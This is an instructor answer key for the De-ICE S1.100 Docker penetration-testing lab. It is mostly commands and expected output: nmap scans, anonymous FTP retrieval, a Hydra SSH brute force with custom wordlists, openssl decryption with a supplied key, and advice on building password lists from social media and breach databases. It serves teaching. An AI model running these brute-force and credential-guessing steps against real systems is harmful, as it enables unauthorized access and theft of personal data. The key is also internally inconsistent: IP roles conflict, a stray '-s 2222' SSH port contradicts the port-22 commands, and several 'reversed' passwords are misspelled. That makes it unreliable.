# De-ICE S1.100 - Instructor Walkthrough & Answer Key

This document provides complete solutions for educators running the De-ICE S1.100 Docker lab.

## Lab Setup Verification

### 1. Start the Lab Environment
```bash
docker compose up -d
docker exec -it de-ice-attacker bash
```

### 2. Verify All Services Are Running
```bash
# From attacker container
nmap -sn 172.20.0.0/24
```

**Expected Output:**
```
Nmap scan report for 172.20.0.1
Host is up (0.000011s latency).
Nmap scan report for 172.20.0.2 (attacker)
Host is up (0.000011s latency).
Nmap scan report for 172.20.0.3
Host is up (0.000011s latency).
Nmap scan report for 172.20.0.4  
Host is up (0.000011s latency).
Nmap scan report for 172.20.0.5
Host is up (0.000011s latency).
Nmap scan report for 172.20.0.6
Host is up (0.000011s latency).
Nmap scan report for 172.20.0.7
Host is up (0.000011s latency).
```

**Target IPs Discovered:**
- 172.20.0.2 - SMTP server (MailHog)
- 172.20.0.3 - SSH server  
- 172.20.0.4 - FTP server
- 172.20.0.5 - Web server
- 172.20.0.6 - Mail server (Dovecot POP3/IMAP)
- 172.20.0.7 - Attacker machine (Kali)

## Phase 1: Reconnaissance (Expected Student Results)

### Network Discovery and Port Scanning
```bash
# Step 1: Network discovery 
nmap -sn 172.20.0.0/24

# Step 2: Port scan discovered targets
nmap -sC -sV 172.20.0.2 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6
```

**Expected Ports Discovered:**
- 172.20.0.2: 1025/tcp (SMTP - MailHog), 8025/tcp (HTTP - MailHog Web UI)
- 172.20.0.3: 22/tcp (SSH - OpenSSH)
- 172.20.0.4: 21/tcp (FTP - vsftpd)
- 172.20.0.5: 80/tcp (HTTP - Apache)
- 172.20.0.6: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)

### Web Enumeration
```bash
curl http://172.20.0.5
```

**Expected Findings:**
Students should extract these employee names and emails:
- Alice Adams → aadams@de-ice.net → username: aadams
- Bob Banter → bbanter@de-ice.net → username: bbanter
- Carol Coffee → ccoffee@de-ice.net → username: ccoffee
- Dave Deeds → ddeeds@de-ice.net → username: ddeeds
- Eve Eikman → eeikman@de-ice.net → username: eeikman

## Phase 2: Service Enumeration (Answers)

### FTP Service Investigation
```bash
ftp 172.20.0.4
# Username: anonymous
# Password: (just press Enter)

ftp> ls
ftp> cd incoming
ftp> ls
ftp> binary
ftp> get salary_dec2003.csv.enc
ftp> quit
```

**Expected Result:** Successfully downloads encrypted salary file

### SSH Service Banner
```bash
ssh 172.20.0.3
```

**Expected Banner:** OpenSSH server accepting password authentication

## Phase 3: Exploitation (Step-by-Step Solutions)

### Create Wordlists
```bash
# Username list
cat > users.txt << 'EOF'
aadams
bbanter
ccoffee
ddeeds
eeikman
root
admin
EOF

# Password list (includes common passwords + reversed usernames)
cat > passwords.txt << 'EOF'
password
password123
123456
admin
root
aadams
bbanter
ccoffee
ddeeds
eeikman
smadaa
retnabtb
eeffocc
sdeedd
namkie
company
deice
2003
2004
security
welcome
letmein
EOF

# Alternative: For comprehensive attack, use rockyou.txt
# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
```

### SSH Brute Force Attack

**Educational Brute Force Attack:**
```bash
hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
```

**Expected Successful Credential:**
```
[22][ssh] host: 172.20.0.3   login: aadams   password: smadaa
```

**Teaching Points for Discussion:**

1. **Password Pattern Recognition:**
   - The successful password "smadaa" is "aadams" reversed
   - This demonstrates common weak password patterns users create
   - Students should learn to recognize and exploit such patterns

2. **Real-World OSINT Password Generation:**
   In practice, passwords would be discovered through:
   - **Social Media Research:** Facebook, LinkedIn, Twitter profiles revealing:
     - Pet names, children's names, birthdays
     - Hobbies, favorite sports teams, locations
     - Company events, project names
   - **Professional Networks:** LinkedIn job history, skills, connections
   - **Public Records:** Property records, business registrations
   - **Company Website:** Employee bios, company history, product names
   - **Breach Databases:** Previous password patterns for the target

3. **Advanced Password Lists:**
   For comprehensive attacks, use:
   ```bash
   # Standard comprehensive wordlist
   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
   
   # Custom wordlist from OSINT research
   # Create passwords.txt from gathered intelligence
   ```

4. **Educational Limitation:**
   This lab uses reversed usernames for time efficiency. In real engagements, extensive OSINT would be conducted first to build context-specific password lists.

### SSH Access and Exploration
```bash
ssh aadams@172.20.0.3
# Password: smadaa

# Once inside:
whoami
id
ls -la
pwd
find . -name "*.txt" -o -name "*.csv" 2>/dev/null
```

**Expected Findings:**
- User: aadams
- Home directory access
- Limited privileges (non-root user)

## Phase 4: File Analysis & Decryption

### Decrypt Salary File
```bash
# Try common passwords for decryption
openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "HeadOfSecurity"
```

**Expected Success:** File decrypts successfully

### View Decrypted Content
```bash
cat salary.csv
```

**Expected Content:**
```
Employee Name,Department,Annual Salary,Start Date
Alice Adams,Human Resources,55000,2001-03-15
Bob Banter,Information Technology,65000,2000-08-22
Carol Coffee,Finance,58000,2002-01-10
Dave Deeds,Marketing,52000,2003-05-18
Eve Eikman,Legal Affairs,72000,1999-11-30
```

## Phase 5: Advanced Exploitation (Optional)

### Password Pattern Analysis
Students should notice that `smadaa` is `aadams` reversed, suggesting:
1. Passwords may be reversed words
2. Other users might have similar patterns

### Additional Service Enumeration
```bash
# SMTP Banner
telnet 172.20.0.2 1025
# Type: EHLO test
# Expected: MailHog SMTP server response

# POP3 Banner  
telnet 172.20.0.6 110
# Expected: Dovecot POP3 server ready

# IMAP Banner
telnet 172.20.0.6 143  
# Expected: Dovecot IMAP server ready
```

## Common Student Errors & Troubleshooting

### Error: "Connection Refused"
**Cause:** Student using wrong IP address/port
**Solution:** Ensure using correct IP addresses discovered from network scan and correct ports

### Error: "Host not found"
**Cause:** Student not in attacker container
**Solution:** `docker exec -it de-ice-attacker bash`

### Error: "Hydra shows no results"
**Cause:** Wrong port or service specification
**Solution:** Ensure using `-s 2222` for SSH port

### Error: "FTP login fails"
**Cause:** Student entering wrong credentials
**Solution:** Use `anonymous` / `anonymous` or just press Enter for password

### Error: "File decryption fails"
**Cause:** Wrong password or algorithm
**Solution:** Use exact command: `openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "HeadOfSecurity"`

## Assessment Rubric

### Basic Level (Pass)
- [ ] Successfully discovers open ports
- [ ] Extracts usernames from website
- [ ] Connects to FTP anonymously
- [ ] Downloads encrypted file

### Intermediate Level (Credit)
- [ ] Successfully brute forces SSH
- [ ] Gains SSH access with aadams account
- [ ] Decrypts salary file
- [ ] Documents findings clearly

### Advanced Level (Distinction)
- [ ] Enumerates all services thoroughly
- [ ] Identifies password patterns
- [ ] Explores additional attack vectors
- [ ] Provides detailed security recommendations

## Security Lessons Learned

### Key Vulnerabilities Demonstrated
1. **Information Disclosure:** Employee data exposed on website
2. **Weak Authentication:** Easily guessable SSH password
3. **Anonymous FTP:** Sensitive files accessible without authentication
4. **Weak Encryption:** Predictable encryption password
5. **Service Enumeration:** Multiple unnecessary services exposed

### Defensive Recommendations Students Should Identify
1. Remove employee details from public website
2. Implement strong password policies
3. Disable anonymous FTP access
4. Use strong encryption keys
5. Close unnecessary service ports
6. Implement multi-factor authentication
7. Regular security audits and penetration testing

## Lab Cleanup
```bash
# From host system
docker compose down
docker system prune -f
```

## Troubleshooting Lab Issues

### Container Won't Start
```bash
docker compose down
docker system prune -f
./setup.sh
```

### Network Issues
```bash
docker network prune -f
docker compose up -d
```

### Permission Issues
```bash
chmod +x setup.sh
chmod +x attacker-tools/*.sh
```

This walkthrough provides complete solutions and expected outcomes for all lab phases. Students should be able to achieve all listed results following the penetration testing methodology.